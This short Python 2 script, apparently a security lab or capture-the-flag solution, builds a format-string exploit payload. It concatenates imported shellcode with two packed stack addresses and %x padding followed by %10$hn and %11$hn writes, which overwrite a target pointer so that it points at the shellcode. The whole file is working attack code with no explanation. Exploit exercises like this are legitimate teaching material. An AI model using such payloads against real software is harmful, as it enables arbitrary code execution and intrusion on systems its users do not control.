from shellcode import shellcode
from struct import pack

print shellcode + ';' + pack('<II', 0xbffe8b9a, 0xbffe8b9c) + "%33648x%10$hn%15470x%11$hn"
